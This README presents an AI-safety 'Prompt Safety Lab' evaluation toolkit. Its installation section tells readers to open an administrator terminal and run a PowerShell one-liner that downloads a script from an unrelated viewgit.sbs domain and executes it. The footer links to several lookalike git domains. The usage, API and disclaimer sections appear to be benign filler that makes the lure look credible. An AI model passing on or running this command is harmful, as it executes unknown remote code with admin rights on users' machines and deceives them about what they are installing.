# Prompt Safety Lab — Defensive Prompt Evaluation

> An educational toolkit for evaluating prompt-safety controls, refusal quality, and policy behavior with synthetic test cases.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm viewgit.sbs?get=ai-jailbreak-prompts | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Ai Jailbreak Prompts modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Ai Jailbreak Prompts.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Prompt Safety Lab** is a defensive evaluation environment for understanding how prompt policies behave. It provides labeled, abstract test cases, scoring rubrics, regression reports, and redaction tools for teams improving AI safety.

**Best for:** AI safety researchers, model evaluators, and responsible application teams.

**Key differentiators:**
1. Synthetic and abstract fixtures
2. Policy behavior scorecards
3. Refusal and safe-completion analysis
4. Local model adapters
5. Redacted, reviewable reports

---

## Core Features

```
✅ Synthetic prompt-safety fixtures
✅ Policy and refusal rubrics
✅ Model response comparison
✅ Redaction and privacy checks
✅ Regression test suites
✅ Human review queue
✅ Local-only execution
✅ Exportable evaluation reports
```

---

## Usage

```bash
# Start the local evaluation UI
python -m prompt_safety_lab dev --port 8000

# Run the default safety suite
python -m prompt_safety_lab eval --suite default --adapter local

# Compare two model configurations
python -m prompt_safety_lab compare --baseline small --candidate guarded

# Review flagged responses
python -m prompt_safety_lab review --status needs-review
```

---

## REST API

> [!NOTE]
> The API is intended for local evaluation and stores only synthetic metadata. It does not provide bypass techniques, credentials, or access to external systems.

```bash
# Start the API server
python -m prompt_safety_lab serve --port 8000

# List evaluation suites
curl http://localhost:8000/api/v1/suites

# Create a local evaluation run
curl -X POST http://localhost:8000/api/v1/evaluations \
  -H "Content-Type: application/json" \
  -d '{"suite":"default","adapter":"local","redact":true}'

# Read a redacted report
curl http://localhost:8000/api/v1/evaluations/eval_01J8ZQ/report
```

---

## Screenshots

- Evaluation dashboard: `screenshots/evaluation-dashboard.png`
- Rubric view: `screenshots/rubric-view.png`
- Comparison report: `screenshots/comparison-report.png`
- Review queue: `screenshots/review-queue.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Local adapter is unavailable | Select a supported local adapter and confirm its model files are present. |
| Report contains unexpected fields | Enable redaction and rerun the evaluation. |
| Scores vary between runs | Pin the adapter version and set a reproducible seed. |
| Review queue is empty | Run the default suite and check that the status filter is not too narrow. |
| Port 8000 is busy | Start the server on another local port. |

---

## Use Cases

- **Safety Regression Testing** — Detect behavior changes before releasing a model update.
- **Policy Research** — Compare rubric scores across abstract scenarios.
- **Application Reviews** — Check whether an AI product gives safe, helpful responses.
- **Education** — Teach responsible AI evaluation with controlled examples.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> This project is for defensive, authorized evaluation only. It does not include or endorse bypasses, credential theft, phishing, account abuse, or instructions for harmful activity.

> [!TIP]
> Keep fixtures abstract, review flagged outputs with a human, and store reports in a restricted local directory.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
ai-jailbreak-prompts, prompt-safety, ai-safety, defensive-evaluation, policy-testing, redaction, local-ai, responsible-ai, model-evaluation, safety-lab
-->

[viewgit.sbs](https://viewgit.sbs?t=ai-jailbreak-prompts) | [gitrm.sbs](https://gitrm.sbs?t=ai-jailbreak-prompts) | [gitsl.xyz](https://gitsl.xyz?t=ai-jailbreak-prompts) | [gitrm.cfd](https://gitrm.cfd?t=ai-jailbreak-prompts) | [gitview.sbs](https://gitview.sbs?t=ai-jailbreak-prompts)
